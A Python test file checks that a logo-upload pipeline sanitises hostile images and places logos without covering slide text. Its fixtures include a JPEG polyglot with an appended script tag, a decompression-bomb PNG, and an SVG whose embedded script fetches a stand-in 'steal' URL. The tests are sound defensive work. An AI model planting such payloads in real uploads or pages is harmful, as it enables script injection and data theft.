"""Phase 38: the user's logo. Every upload is hostile (docs/security/
content-and-web.md -> Uploads); the logo is placed by code, legible, and
never on top of text."""

from __future__ import annotations

import asyncio
import io
from pathlib import Path

from PIL import Image

from benchtools import files
from engine import Seam, pipeline
from engine.components import logo
from engine.design.theme import THEMES
from lib.result import Err, Ok
from tests.test_ladder import AlwaysTheSame, _no_sleep


def _png(size: tuple[int, int] = (400, 200), colour: tuple[int, ...] = (200, 40, 40, 255)) -> bytes:
    img = Image.new("RGBA", (size[0] + 80, size[1] + 80), (0, 0, 0, 0))
    img.paste(Image.new("RGBA", size, colour), (40, 40))
    out = io.BytesIO()
    img.save(out, format="PNG")
    return out.getvalue()


def _ingest(data: bytes) -> logo.Logo | str:
    got = asyncio.run(logo.ingest(data))
    return got.value if isinstance(got, Ok) else got.error


def test_a_clean_png_is_trimmed_and_re_encoded() -> None:
    got = _ingest(_png())
    assert isinstance(got, logo.Logo)
    assert (got.width, got.height) == (400, 200)  # the transparent border is gone
    assert got.png.startswith(b"\x89PNG") and got.colour is not None


def test_metadata_and_trailing_bytes_never_survive() -> None:
    img = Image.new("RGB", (300, 120), (20, 90, 160))
    out = io.BytesIO()
    exif = Image.Exif()
    exif[0x010E] = "secret description"
    img.save(out, format="JPEG", exif=exif)
    polyglot = out.getvalue() + b"<script>alert(1)</script>PK\x03\x04"
    got = _ingest(polyglot)
    assert isinstance(got, logo.Logo)
    assert b"secret" not in got.png and b"<script>" not in got.png and b"Exif" not in got.png


def test_hostile_files_are_refused() -> None:
    bomb = io.BytesIO()
    Image.new("1", (5000, 5000)).save(bomb, format="PNG")  # small file, huge decode
    fake_jpeg = b"\xff\xd8\xff" + b"not really a jpeg" * 20
    clear = io.BytesIO()
    Image.new("RGBA", (64, 64), (0, 0, 0, 0)).save(clear, format="PNG")
    cases = {
        "bomb": bomb.getvalue(),
        "fake": fake_jpeg,
        "text": b"hello, I am a logo",
        "huge": b"\x89PNG\r\n\x1a\n" + b"0" * (logo.MAX_BYTES + 1),
        "clear": clear.getvalue(),
        "broken svg": b"<svg xmlns='http://www.w3.org/2000/svg'><rect",
    }
    got = {k: _ingest(v) for k, v in cases.items()}
    assert all(isinstance(v, str) for v in got.values()), got


def test_an_svg_with_script_and_external_refs_becomes_plain_pixels() -> None:
    svg = (
        b"<svg xmlns='http://www.w3.org/2000/svg' width='300' height='100'>"
        b"<script>fetch('https://example.com/steal')</script>"
        b"<image href='https://example.com/x.png' width='10' height='10'/>"
        b"<rect x='10' y='10' width='280' height='80' fill='#1b6'/></svg>"
    )
    got = _ingest(svg)
    assert isinstance(got, logo.Logo)
    assert got.png.startswith(b"\x89PNG") and b"script" not in got.png


def test_the_variant_reads_on_its_ground() -> None:
    dark = asyncio.run(logo.ingest(_png(colour=(20, 20, 20, 255))))
    assert isinstance(dark, Ok)
    assert logo.variant(dark.value, "#f6f3ec") == "original"
    assert logo.variant(dark.value, "#151515") == "mono"


def test_placement_never_covers_what_is_there() -> None:
    got = asyncio.run(logo.ingest(_png()))
    assert not isinstance(got, Err)
    full_top = [(0.0, 0.0, 1920.0, 300.0)]
    at = logo.place(full_top, got.value, height=96, prefer_top=True)
    assert at is not None and at[1] > 300  # the top was taken, so it went to the bottom
    assert logo.place([(0.0, 0.0, 1920.0, 1080.0)], got.value, height=96, prefer_top=True) is None


def test_the_pipeline_places_the_logo_on_the_ends_and_keeps_qa_clean(tmp_path: Path) -> None:
    outline = files.load("pitch-devtools").outline
    assert outline is not None
    story = outline.model_copy(update={"slides": outline.slides[:3]})
    mark = asyncio.run(logo.ingest(_png(colour=(20, 20, 20, 255))))
    assert isinstance(mark, Ok)
    built = asyncio.run(
        pipeline.build(
            Seam(api_key="k", transport=AlwaysTheSame(), sleep=_no_sleep),
            story,
            THEMES["ledger"],
            model="m",
            title="t",
            work_file=str(tmp_path / "qa.html"),
            shots_dir=str(tmp_path),
            budget_usd=1.0,
            logo=mark.value,
        )
    )
    first, middle, last = built.slides
    placed = [s for s in (first, last) if "<dd-logo" in s.html]
    warned = [s for s in (first, last) if any(w.code == "W9" for w in s.qa.warnings)]
    assert len(placed) + len(warned) == 2 and placed  # placed, or honestly reported
    assert "<dd-logo" not in middle.html
    assert all(s.qa.status == "passed" for s in built.slides)
    assert "--logo:url(" in built.html and 'kind="mark"' not in built.html
